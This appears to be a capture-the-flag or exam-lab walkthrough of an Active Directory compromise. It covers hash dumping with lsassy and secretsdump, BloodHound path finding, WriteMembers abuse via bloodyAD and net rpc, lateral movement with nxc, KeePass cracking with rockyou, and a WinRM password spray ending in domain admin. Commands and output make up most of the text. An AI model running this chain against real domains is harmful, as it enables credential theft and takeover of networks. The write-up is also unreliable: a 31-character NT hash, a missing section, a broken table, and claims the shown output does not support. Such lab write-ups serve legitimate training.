# 06 — DC20: pass-the-hash, ACL abuse, KeePass, domain admin

Everything after WS01 happens with **perry**, a plain domain user who turns out to have two useful
properties: a hash that works as a password, and the `WriteMembers` right on a helpdesk group that is
local admin on the next server. The DC itself is never brute-forced — it falls to a password that was
sitting in someone's KeePass database.

> **Note.** Long commands wrap at the terminal width; the flags are masked.

## 6.1 The hash is enough

`lsassy` on WS01 returned perry's NT hash. The same run also captured the cleartext line, which is
what the later steps use:

```
WS01\l.andrew      58836e8b8f091253ae14d4115e6d7704
WS01\Administrator 289f3285a8f5d524e535c29917f2ea06
WS01\l.perry       0acba8f16de9d8d6b0d6c725356c3c2
OSCP.EXAM\perry    SurfaceConditionMove441
```

| Value | Status |
|---|---|
| `0acba8f16de9d8d6b0d6c725356c3c2` | read from a `bloodyAD --hashes` line — **reliable** |
| `SurfaceConditionMove441` | repeated in the lsassy line, `net rpc` and nxc — **reliable** |

> Note the word: `Surface`, not `Race`. The two are easy to confuse; the hash line confirms it.

Knowing the hash is enough, but the cleartext is better: `secretsdump` as the local Administrator on
WS01 recovers it directly.

```bash
impacket-secretsdump 'oscp.exam/administrator:<local-admin-password>@192.168.91.206'
```

```

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:289f3285a8f5d524e535c29917f2ea06:::
```

`lsassy` gave the hash; `secretsdump` gave the password. Either is enough to continue — the password
is only needed for the tools that cannot pass a hash (`net rpc`).

```
SMB 192.168.91.206 445 WS01  [+] oscp.exam\perry:0acba8f16de9d8d6b0d6c725356c3c2
```

The same sweep over the internal range finds the two hosts behind WS01:

```
[*] Windows Server 2022 Build 20348 x64 (name:DC20)  (domain:oscp.exam) (signing:True)  (SMBv1:None)
```

|---|---|---|
| WS01 | edge workstation (dual-homed) | `192.168.91.206` / `172.16.91.206` |

At this point perry is an ordinary user on all three — `[+]` but **no** `(Pwn3d!)`.

## 6.3 BloodHound

Collected with perry's credentials. The run output:

```
[*] Verbosity level: Info
[*] Collection method: All
[+] Connected to OSCP.EXAM ACTIVE DIRECTORY
[*] All data collected for NamingContext DC=oscp,DC=exam
[*] All data collected for NamingContext DC=DomainDnsZones,DC=oscp,DC=exam
[*] All data collected for NamingContext DC=ForestDnsZones,DC=oscp,DC=exam
[*] All data collected for NamingContext CN=Configuration,DC=oscp,DC=exam
```

The path it produced: **`perry` → (control) → `HELPDESK USERS`**, with the group carrying a
membership edge. In BloodHound terms this is the classic
`WriteMembers` / `AddMember` edge — a user who can rewrite the member list of a group.

Why it matters: `HELPDESK USERS` is in the local `Administrators` group of **SRV22**. Rewriting that
group's membership is therefore equivalent to local admin on SRV22 — without touching a single
password.

## 6.4 Do it with bloodyAD

```bash
python3 bloodyAD.py --host 192.168.91.206 -u perry \
  --action write --rights WriteMembers --principal perry \
  --target-dn 'CN=HELPDESK USERS,CN=USERS,DC=oscp,DC=exam' \
  --hashes 0acba8f16de9d8d6b0d6c725356c3c2
```

The `--hashes` argument is what makes this a pass-the-hash ACL edit. Two things are certain: the
action/rights/principal/target-DN arguments, and the `--hashes` value above.

## 6.5 Do it again with net rpc (and the password)

```bash
net rpc group addmem "HELPDESK USERS" "perry" \
  -U 'oscp.exam\perry%SurfaceConditionMove441' -S 'DC20.oscp.exam'
```

The first attempt fails — the `-U` argument is mis-quoted (`-U 'oscp.exam'%'…'`). The
corrected line, which succeeds, is the one above. Two lessons: quote the whole
`domain\user%password` string, and `net rpc` needs the **DC** in `-S`, not a member server.

## 6.6 Lateral movement to SRV22

```bash
nxc smb <SRV22> -u perry -p 'SurfaceConditionMove441'
```

```
SMB <SRV22> 445 SRV22 [*] Windows Server 2022 Build 20348 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB <SRV22> 445 SRV22 [+] oscp.exam\perry:SurfaceConditionMove441 (Pwn3d!)
```

`(Pwn3d!)` here is the whole point: a minute earlier the same credentials returned a bare `[+]`. Group
membership changed; the account did not.

On SRV22's Desktop sits **`Confidential.kdbx`** — a KeePass database. Retrieved over SMB with the
same credentials; the file lands in the local Windows Downloads folder.

## 6.7 Crack the KeePass database

```bash
git clone https://github.com/<author>/keepasscracker.git
python3 keepasscracker/keepasscracker.py -d Confidential.kdbx -w /usr/share/wordlists/rockyou.txt
```

```
Using libkeepass
Starting bruteforce process...
[+] Found! Database password: 12/05/2015
Stopping bruteforce process.
Done.
```

| Value | Confidence |
|---|---|
| tool | `keepasscracker` (cloned from GitHub) |
| wordlist | `rockyou.txt` |
| master password | `12/05/2015` — a date in `MM/DD/YYYY` form, cracked from rockyou |

A date as the master password is exactly why the box includes rockyou: the list contains dates in
`MM/DD/YYYY` form, so a human-chosen date falls in minutes.

## 6.8 Four entries, one of them is a domain admin

The DB is opened in KeePassXC. Four entries, all with username `administrator@oscp.exam`:

| Title | URL |
|---|---|
| `Finance Portal` | `finance.oscp.exam` |
| `Mail` | `mail.oscp.exam` |
| `Helpdesk` | `helpdesk.oscp.exam` |
| `AD` | `AD.oscp.exam` |

The `AD` entry's password is displayed in clear in the UI:

```
BackupPassword2024
```

The sequence: the four passwords do **not** work for `administrator`; BloodHound's **Domain Admins**
list gives another name — `GALLAGHER` — and the four passwords are tried against that account instead.

## 6.9 WinRM as a domain admin

```bash
nxc winrm 172.16.91.200 -u "GALLAGHER" -p passwords
nxc winrm 172.16.91.200 -u "GALLAGHER" -p FinancePortal2023
nxc winrm 172.16.91.200 -u "GALLAGHER" -p MyAwesomePass555
nxc winrm 172.16.91.200 -u "GALLAGHER" -p 'BackupPassword2024'
```

```
WINRM 172.16.91.200 5985 DC20 [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam)
WINRM 172.16.91.200 5985 DC20 [-] oscp.exam\GALLAGHER:passwords
WINRM 172.16.91.200 5985 DC20 [-] oscp.exam\GALLAGHER:FinancePortal2023
WINRM 172.16.91.200 5985 DC20 [-] oscp.exam\GALLAGHER:MyAwesomePass555
WINRM 172.16.91.200 5985 DC20 [+] oscp.exam\GALLAGHER:BackupPassword2024 (Pwn3d!)
```

The first three are KeePass entries; the fourth is the `AD` entry. **`GALLAGHER` is a Domain Admin**,
so the `AD` record's password was really the backup password of a privileged account — not of
`administrator`, which is why the earlier spray failed.
